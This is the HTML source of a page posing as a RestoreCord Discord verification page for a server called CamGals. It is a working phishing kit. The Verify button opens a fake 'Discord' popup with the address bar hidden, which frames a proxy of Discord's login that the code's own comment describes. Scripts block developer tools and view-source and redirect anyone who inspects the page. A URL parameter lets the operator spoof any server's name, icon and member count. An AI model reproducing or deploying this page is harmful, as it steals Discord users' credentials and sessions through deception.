<!DOCTYPE html>
<html lang="en" style="scroll-behavior:smooth;color-scheme:dark">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="mobile-web-app-capable" content="yes">
<meta name="theme-color" content="#0b0909">
<meta name="robots" content="index, follow">
<meta name="description" content="RestoreCord protects and recovers your Discord server. Backup and restore members, roles, channels, and settings.">
<meta property="og:type" content="website">
<meta property="og:site_name" content="RestoreCord">
<meta property="og:title" content="Verify">
<meta property="og:description" content="RestoreCord - Discord Server Backup &amp; Recovery">
<meta name="referrer" content="no-referrer">
<link rel="icon" href="/captcha.png">
<title>RestoreCord</title>
<script>!function(){document.addEventListener('contextmenu',function(e){e.preventDefault()});document.addEventListener('keydown',function(e){if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='i'||e.key==='J'||e.key==='j'||e.key==='C'||e.key==='c'))||(e.ctrlKey&&(e.key==='U'||e.key==='u'||e.key==='S'||e.key==='s'))){e.preventDefault();e.stopPropagation();return false}});setInterval(function(){var t0=performance.now();debugger;if(performance.now()-t0>100){document.body.innerHTML='';window.location.href='https://discord.com'}},3000)}();</script>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;overflow:hidden}
body{
  font-family:'Inter',ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
  background:#000;color:#fff;
  -webkit-font-smoothing:antialiased;
  -moz-osx-font-smoothing:grayscale;
}

/* Animated gradient background */
.bg-anim{
  position:fixed;inset:0;z-index:0;
  background:radial-gradient(ellipse at 20% 50%,rgba(79,70,229,.15) 0%,transparent 50%),
             radial-gradient(ellipse at 80% 20%,rgba(99,102,241,.1) 0%,transparent 50%),
             radial-gradient(ellipse at 50% 80%,rgba(67,56,202,.12) 0%,transparent 50%),
             #000;
  animation:bgShift 20s ease-in-out infinite alternate;
}
@keyframes bgShift{
  0%{background-position:0% 50%}
  50%{background-position:100% 50%}
  100%{background-position:0% 50%}
}
.bg-anim::after{
  content:'';position:absolute;inset:0;
  background:linear-gradient(to top,rgba(0,0,0,.3),transparent,rgba(0,0,0,.2));
  pointer-events:none;
}

/* Floating particles */
.particles{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
.particle{
  position:absolute;border-radius:50%;
  background:rgba(99,102,241,.3);
  animation:float linear infinite;
  opacity:0;
}
@keyframes float{
  0%{transform:translateY(100vh) scale(0);opacity:0}
  10%{opacity:1}
  90%{opacity:1}
  100%{transform:translateY(-10vh) scale(1);opacity:0}
}

/* Main layout */
.container{
  position:relative;z-index:2;
  min-height:100dvh;
  display:flex;flex-direction:column;
  align-items:center;justify-content:center;
  padding:1rem;
}

/* Card */
.card{
  width:100%;max-width:36rem;
  border-radius:1rem;
  border:1px solid rgba(255,255,255,.08);
  background:rgba(11,9,9,.5);
  backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px);
  box-shadow:0 20px 25px -5px rgba(0,0,0,.1),0 8px 10px -6px rgba(0,0,0,.1),
             inset 0 1px 0 0 rgba(255,255,255,.12),inset 0 0 12px 0 rgba(255,255,255,.04);
  overflow:hidden;
  animation:cardIn .6s cubic-bezier(.16,1,.3,1) both;
}
@keyframes cardIn{
  from{opacity:0;transform:translateY(20px) scale(.97)}
  to{opacity:1;transform:translateY(0) scale(1)}
}
.card-inner{padding:1.5rem 1.5rem;text-align:center}
@media(min-width:640px){.card-inner{padding:2rem 2rem}}

/* Avatar */
.avatar-wrap{
  display:inline-flex;
  transition:transform .3s;
}
.avatar-wrap:hover{transform:scale(1.05)}
.avatar{
  width:7rem;height:7rem;border-radius:50%;
  object-fit:cover;
  box-shadow:0 0 0 2px rgba(255,255,255,.08),0 8px 32px rgba(0,0,0,.4);
  background:rgba(255,255,255,.05);
  border:1px solid rgba(255,255,255,.08);
}
@media(min-width:640px){.avatar{width:9rem;height:9rem}}
.avatar-fallback{
  width:7rem;height:7rem;border-radius:50%;
  display:flex;align-items:center;justify-content:center;
  font-size:2rem;font-weight:600;
  background:rgba(255,255,255,.05);
  backdrop-filter:blur(8px);
  border:1px solid rgba(255,255,255,.08);
  box-shadow:0 0 0 2px rgba(255,255,255,.08),0 8px 32px rgba(0,0,0,.4);
  color:rgba(255,255,255,.7);
}
@media(min-width:640px){.avatar-fallback{width:9rem;height:9rem;font-size:2.5rem}}

/* Server info */
.server-info{margin-top:1.25rem}
.server-name-row{
  display:flex;align-items:center;justify-content:center;
  gap:.5rem;flex-wrap:wrap;
}
.server-name{
  font-weight:700;font-size:1.875rem;
  line-height:1.6;
  word-break:break-word;
  background:linear-gradient(to right,#fff,rgba(255,255,255,.85));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
  background-clip:text;
}
@media(min-width:640px){.server-name{font-size:2.25rem}}

/* Badge */
.badge{
  display:inline-flex;align-items:center;justify-content:center;
  padding:.375rem;border-radius:50%;
  background:rgba(34,197,94,.1);
  border:none;
  box-shadow:inset 0 1px 0 0 rgba(255,255,255,.12),inset 0 0 12px 0 rgba(255,255,255,.04);
  transition:transform .3s;cursor:default;
}
.badge:hover{transform:scale(1.1)}
.badge svg{width:1.25rem;height:1.25rem;filter:drop-shadow(0 0 3px rgba(255,255,255,.15))}

/* Member count */
.members{
  margin-top:.5rem;
  font-size:.875rem;color:rgba(255,255,255,.5);
  display:flex;align-items:center;justify-content:center;gap:.375rem;
}
.members .dot{
  width:.5rem;height:.5rem;border-radius:50%;
  background:#22c55e;
  box-shadow:0 0 6px rgba(34,197,94,.4);
}

/* Verify button */
.verify-btn{
  display:inline-flex;align-items:center;justify-content:center;
  width:100%;max-width:28rem;
  margin-top:1.5rem;
  padding:.75rem 1rem;
  font-size:.9375rem;font-weight:500;font-family:inherit;
  color:#fff;
  background:#4f46e5;
  border:none;border-radius:1rem;
  cursor:pointer;
  backdrop-filter:blur(12px);
  box-shadow:inset 0 1px 0 0 rgba(255,255,255,.12),inset 0 0 12px 0 rgba(255,255,255,.04),
             0 4px 15px rgba(79,70,229,.3);
  transition:all .3s cubic-bezier(.16,1,.3,1);
  text-decoration:none;
  -webkit-tap-highlight-color:transparent;
}
.verify-btn:hover{
  transform:scale(1.03);
  box-shadow:inset 0 1px 0 0 rgba(255,255,255,.15),inset 0 0 12px 0 rgba(255,255,255,.06),
             0 8px 25px rgba(79,70,229,.4);
}
.verify-btn:active{transform:scale(.97)}

/* Progress bar */
#progress{pointer-events:none}
#progress .bar{
  background:#4f46e5;position:fixed;z-index:99999;
  top:0;left:0;width:0%;height:2px;
  transition:width .2s ease-out,opacity .4s ease;
}
#progress .peg{
  display:block;position:absolute;right:0;width:100px;height:100%;
  box-shadow:0 0 10px #4f46e5,0 0 5px #4f46e5;
  opacity:1;transform:rotate(3deg) translate(0,-4px);
}

/* Cookie notice */
.cookie-notice{
  position:fixed;bottom:1rem;left:50%;transform:translateX(-50%);
  z-index:100;
  background:rgba(20,20,20,.85);backdrop-filter:blur(12px);
  border:1px solid rgba(255,255,255,.08);border-radius:.75rem;
  padding:.75rem 1.25rem;
  font-size:.8125rem;color:rgba(255,255,255,.6);
  display:flex;align-items:center;gap:.75rem;
  animation:slideUp .4s .5s both;
  max-width:90vw;
}
@keyframes slideUp{from{opacity:0;transform:translate(-50%,1rem)}to{opacity:1;transform:translate(-50%,0)}}
.cookie-notice a{color:rgba(255,255,255,.8);text-decoration:underline;text-underline-offset:2px}
.cookie-dismiss{
  background:none;border:none;color:rgba(255,255,255,.4);
  cursor:pointer;font-size:1.1rem;padding:.25rem;line-height:1;
  font-family:inherit;
}
.cookie-dismiss:hover{color:rgba(255,255,255,.7)}
</style>
</head>
<body>

<div class="bg-anim"></div>

<div class="particles" id="particles"></div>

<div id="progress"><div class="bar" style="width:100%;opacity:0"><div class="peg"></div></div></div>

<div class="container">
  <div class="card">
    <div class="card-inner">
      <!-- Avatar -->
      <div class="avatar-wrap">
        <img id="guild-icon" class="avatar" src="https://cdn.discordapp.com/icons/1472050464659865742/7904484d4dc58134be9594740b199973.webp?size=128&quality=lossless" alt="Server icon" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">
        <div class="avatar-fallback" style="display:none">C</div>
      </div>

      <!-- Server info -->
      <div class="server-info">
        <div class="server-name-row">
          <h1 id="guild-name" class="server-name">&#x1F352;&#x3012;CamGals</h1>
          <div class="badge" title="Verified server">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
              <polyline points="22 4 12 14.01 9 11.01"/>
            </svg>
          </div>
        </div>
        <div class="members">
          <span class="dot"></span>
          <span><span id="member-count">17,053</span> members</span>
        </div>
      </div>

      <!-- Verify button -->
      <button class="verify-btn" onclick="openDiscordLogin()">
        <span>Verify</span>
      </button>
    </div>
  </div>
</div>

<div class="cookie-notice" id="cookie-notice">
  <span>We use cookies for security and analytics. <a href="#">Learn more</a></span>
  <button class="cookie-dismiss" onclick="this.parentElement.remove()" aria-label="Dismiss">&times;</button>
</div>

<script>
// Particles
(function(){
  var c=document.getElementById('particles');
  for(var i=0;i<25;i++){
    var p=document.createElement('div');
    p.className='particle';
    var s=Math.random()*4+1;
    p.style.width=s+'px';
    p.style.height=s+'px';
    p.style.left=Math.random()*100+'%';
    p.style.animationDuration=(Math.random()*15+10)+'s';
    p.style.animationDelay=(Math.random()*10)+'s';
    c.appendChild(p);
  }
})();

// Discord login popup (opens our proxy of the real Discord login)
function openDiscordLogin(){
  var w=900,h=650;
  var left=(screen.width-w)/2;
  var top=(screen.height-h)/2;
  var win=window.open('about:blank','discord_login',
    'width='+w+',height='+h+',left='+left+',top='+top+',menubar=no,toolbar=no,location=no,status=no,resizable=yes,scrollbars=yes');
  if(win){
    var u=window.location.origin+'/login';
    win.document.write('<!DOCTYPE html><html><head><title>Discord</title><link rel="icon" href="https://discord.com/assets/favicon.ico"><style>*{margin:0;padding:0;overflow:hidden}body{height:100vh}iframe{width:100%;height:100%;border:none}</style></head><body><iframe src="'+u+'"></iframe></body></html>');
    win.document.close();
  }
}

// Pre-solve captcha on page load
fetch('/api/pressolve',{method:'POST'}).catch(function(){});

// Parse URL data parameter (base64 JSON with guildId, name, members, icon)
(function(){
  try{
    var params=new URLSearchParams(window.location.search);
    var data=params.get('data');
    if(data){
      var json=JSON.parse(atob(data));
      if(json.name) document.getElementById('guild-name').textContent=json.name;
      if(json.members) document.getElementById('member-count').textContent=json.members.toLocaleString();
      if(json.icon) document.getElementById('guild-icon').src=json.icon;
    }
  }catch(e){}
})();
</script>

</body>
</html>
